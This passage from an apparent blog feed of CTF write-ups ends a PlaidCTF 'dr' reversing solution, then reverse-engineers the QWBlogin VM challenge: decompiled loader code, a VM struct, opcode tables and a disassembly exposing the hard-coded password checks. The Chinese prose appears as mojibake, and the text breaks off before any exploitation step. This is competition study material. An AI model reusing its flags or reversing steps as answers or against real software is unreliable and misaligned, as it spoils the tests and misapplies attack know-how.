d)</code>ä¸­</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>ä¸”<code>a c</code>å¯äº¤æ¢ï¼Œ<code>b d</code>å¯äº¤æ¢ï¼Œç„¶åå¿…é¡»è¦<code>10</code>å¼€å¤´ï¼Œå¿…é¡»è¦3ä¸ª<code>10</code>ï¼Œä¸èƒ½å‡ºç°<code>73</code>ï¼Œä¸”ä¸¤ä¸ª<code>Consider</code>éœ€è¦æ»¡è¶³</p><p>å› æ­¤å¯ä»¥å†™å‡ºè„šæœ¬çˆ†ç ´ï¼Œæœ€åå¯ä»¥å¾—åˆ°ä¸€å †å¯èƒ½çš„è§£</p><p>æœ€åå¯è¡Œçš„ç»“æœ</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>é™„ä¸Šé¢˜ç›®å’Œè„šæœ¬ <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>æˆ‘çš„è„šæœ¬å†™çš„ååˆ†çš„æš´åŠ›ï¼ˆæ— é™å¥—forå¾ªç¯ï¼‰ï¼Œå·¨ç¥å†™çš„å°±å¾ˆç®€å•</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>å¼ºç½‘æ¯çš„ä¸€ä¸ªè™šæ‹Ÿæœºçš„é¢˜ç›®ï¼Œä¹‹å‰åšè¿‡è™šæ‹Ÿæœºçš„é¢˜ç›®ä½†æ˜¯éƒ½æ²¡åšå‡ºæ¥ï¼Œè¿™æ¬¡æ‰“æ¯”èµ›çš„æ—¶å€™ç”±äºæœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œå°±åšäº†ä¸€ç‚¹å°±æ²¡åšäº†ï¼Œç„¶åä»Šå¤©æŠŠè¿™ä¸ªé¢˜ç›®ç£¨å‡ºæ¥äº†ã€‚</p><p>æ‰“å®Œ <code>GACTF2020</code> ä¹‹åæŠŠå…¶ä¸­çš„<code>vmpwn</code>ä¹Ÿæ·»åŠ åœ¨æ­¤</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>è¯¥é¢˜ç»™äº†ä¸€ä¸ª <code>emulator</code>è™šæ‹Ÿæœºï¼Œè¿è¡Œçš„ç±»ä¼¼æœºå™¨ç çš„<code>test.bin</code>å’Œ<code>launch.sh</code>ï¼Œä¹‹å<code>tips</code>çš„æ—¶å€™ç»™äº†<code>Instruction.h</code></p><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><h4 id="main-å‡½æ•°"><a href="#main-å‡½æ•°" class="headerlink" title="main å‡½æ•°"></a>main å‡½æ•°</h4><p>åŸºæœ¬ä¸Šç¨‹åºè¿è¡Œä¾é ä¸€ä¸ªè™šæ‹Ÿæœºçš„ç»“æ„ä½“ï¼Œå¯ä»¥ä»<code>main</code>é‡Œé¢çœ‹åˆ°å°±æ˜¯ <code>v9</code>ç»“æ„ä½“ï¼Œåæ–‡ä¼šå°†ä»‹ç»è¯¥ç»“æ„ä½“</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 å‘ä¸Šå–æ•´</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//é“¾è¡¨ç»“æ„ å¯èƒ½è®°å½• segment flag çš„</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>ç„¶åè¿›å…¥<code>c1a</code>ç»“æ„ä½“çš„æ—¶å€™ï¼Œä¼šå‘ç°<code>IDA</code>æŠ¥å‡ºè¯¥å‡½æ•°å¤ªå¤§æ— æ³•åˆ†æï¼Œåªèƒ½å¦å¤–ç”¨<code>Ghidra</code>çœ‹èƒ½ä¸èƒ½åˆ†æï¼Œç„¶åå‘ç°èƒ½å¤Ÿåç¼–è¯‘ï¼Œäºæ˜¯å¯¹å…¶è¿›è¡Œ<code>dump</code>åç¼–è¯‘çš„æ–‡æœ¬è¿›è¡Œåˆ†æ</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>å…¶ä¸­å…³é”®çš„ç»“æ„ä½“è¢«é€†å‡ºæ¥æ˜¯å¦‚ä¸‹</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>å‰é¢æ˜¯å¯„å­˜å™¨ï¼Œåé¢æ˜¯ä¸€äº›æ®µå’Œå­˜å‚¨çš„<code>io_file</code>é“¾å’Œè™šæ‹Ÿçš„æ ˆ</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>åœ¨<code>0xc1a</code>ç¨‹åºçš„å¼€å§‹å…ˆä¼šåˆ¤æ–­å½“å‰<code>op</code>æ˜¯å¦<code>&lt;2</code>å¦‚æœ<code>&lt;2</code>åˆ™é€€å‡ºï¼Œè¯´æ˜æ¯ä¸€ä¸ªæŒ‡ä»¤è‡³å°‘éƒ½æœ‰ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹‹åç”¨äº†<code>op[1]&amp;0xf</code>è¿›è¡Œ<code>switch case</code>åˆ¤æ–­å½“å‰æŒ‡ä»¤é•¿åº¦</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h4><p>åœ¨æœ€å¼€å§‹çš„æ—¶å€™å‚»ä¹ä¹çš„é¡ºç€<code>dump</code>çš„å‡½æ•°é€†ï¼Œåæ¥é€†å®Œ<code>MOV</code>ä¹‹åè§‰å¾—å…¶ä¸­<code>MUL/DIV/MOD</code>ç­‰ä¸€äº›å†…å®¹éƒ½å¯ä»¥ä¸ç”¨é€†ï¼Œç„¶åæˆ‘è®©ä¸€ä¸ªå­¦å¼Ÿå¸®å¿™é€†<code>XOR/OR/AND</code>ç­‰ä¸€äº›å…¶ä»–çš„ï¼Œæˆ‘å»é€†<code>JMP</code>è¿™æ•´ä¸ªï¼Œåæ¥è§‰å¾—è¿™ä¸ªæ€è·¯é”™äº†ï¼Œå…¶å®å¦‚æœ<code>test.bin</code>çš„ç¨‹åºå¹¶æ²¡æœ‰è‡ªæˆ‘ä¿®æ”¹çš„è¯ï¼Œå…¶å®å¯ä»¥å…ˆæ ¹æ®<code>size</code>å’Œ<code>instrcution</code>æŠŠæŒ‡ä»¤åˆ†äº†ï¼Œå†çœ‹æ˜¯å¦éœ€è¦é€†ä¸€äº›æŒ‡ä»¤ï¼Œæœ€åå‘ç°åªæœ‰<code>mov pop push call ret jmpï¼ˆä¸­é—´å°‘éƒ¨åˆ†ï¼‰syacall</code>éœ€è¦å¾ˆæ¸…æ¥šçš„é€†å‡ºæ¥ï¼Œå…¶ä»–çš„éƒ½å¯ä»¥ä¸ç”¨é€†ã€‚</p><h4 id="æ•´ç†"><a href="#æ•´ç†" class="headerlink" title="æ•´ç†"></a>æ•´ç†</h4><p>æœ€åéœ€è¦çš„æ¯ä¸ªçš„æƒ…å†µéƒ½æ•´ç†æˆå¦‚ä¸‹æ¨¡å¼</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="ç®€æ˜“-emulator"><a href="#ç®€æ˜“-emulator" class="headerlink" title="ç®€æ˜“ emulator"></a>ç®€æ˜“ emulator</h4><p>æœ€åæ ¹æ®æ•´ç†çš„<code>op[0] op[1]</code>è¿›è¡Œç¼–å†™ç®€æ˜“çš„åˆ†å¼€<code>test.bin</code>çš„ç¨‹åº</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span 